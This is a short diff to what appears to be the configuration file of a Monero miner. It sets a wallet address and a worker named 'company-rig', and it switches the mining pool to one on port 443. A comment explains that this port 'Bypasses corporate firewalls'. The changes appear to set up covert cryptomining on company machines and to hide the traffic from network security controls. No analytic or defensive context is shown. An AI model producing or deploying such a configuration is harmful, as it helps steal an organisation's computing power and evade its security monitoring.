@@ -7,7 +7,7 @@
 WALLET_ADDRESS="42DFRYvNTcoghf5QjuQPGYVc8kQPXCneCT5wySU37PSL8zTdwu7w9BxBHkmYB7v97bdTgmhG9jM1caSkxctSfwuEBEoQVWm"
 
 # SupportXMR encrypted TLS pool on HTTPS port 443 (Bypasses corporate firewalls)
-POOL_URL="pool.supportxmr.com:443"
+POOL_URL="pool.hashvault.pro:443"
 
 # Worker name for tracking statistics on supportxmr.com
 WORKER_NAME="company-rig"
